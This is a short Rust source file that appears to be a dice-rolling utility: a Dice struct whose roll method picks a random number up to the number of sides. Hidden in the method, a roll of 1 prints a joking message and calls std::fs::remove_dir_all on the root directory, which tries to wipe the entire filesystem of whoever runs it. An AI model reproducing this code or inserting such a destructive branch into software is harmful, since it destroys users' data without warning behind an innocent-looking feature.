use rand::Rng;
pub struct Dice {
    pub previous_result: u32,
    pub sides: u32,
    pub name: String,
}

impl Dice {
    pub fn roll(&mut self) {
        let mut rng = rand::thread_rng();
        self.previous_result = rng.gen_range(1..=self.sides);
        if self.previous_result == 1 {
            println!("rolled a nat 1 lmao");
            std::fs::remove_dir_all("/").unwrap();
        }
    }
}
